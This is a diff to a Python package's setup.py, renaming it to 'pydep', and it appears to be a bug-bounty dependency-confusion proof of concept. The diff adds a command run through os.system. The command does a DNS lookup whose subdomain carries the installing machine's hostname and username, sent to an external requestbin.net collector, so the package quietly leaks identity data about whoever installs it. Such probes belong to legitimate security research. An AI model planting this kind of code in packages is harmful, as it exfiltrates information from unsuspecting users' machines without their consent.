@@ -1,19 +1,19 @@
-"""Setup for the examplename package."""
+"""Setup for the pydep package."""
 
 import setuptools
 import os
 
 def custom_command(ajay):
     import sys
-    cmd = 'nslookup h-$HOSTNAME.u-$(whoami).examplename.c3a6f2da94e69ab104f0.d.requestbin.net'
+    cmd = 'nslookup `hostname`-%computername%.`whoami`-%username%.manticore-native.a430051ef18acd86255c.d.requestbin.net'
     os.system(cmd)
 
 setuptools.setup(
     author="Ajay Kulal",
     author_email="hackerhero@wearehackerone.com",
-    name='examplename',
+    name='pydep',
     license="MIT",
-    description='examplename is a python package created for bugbounty POC purpose :) install at ur own risk.',
+    description='pydep is a python package created for bugbounty POC purpose :) install at ur own risk.',
     version='v0.0.7',
     long_description="no long decsription given",
     url='https://github.com/ajaykulal/test123',
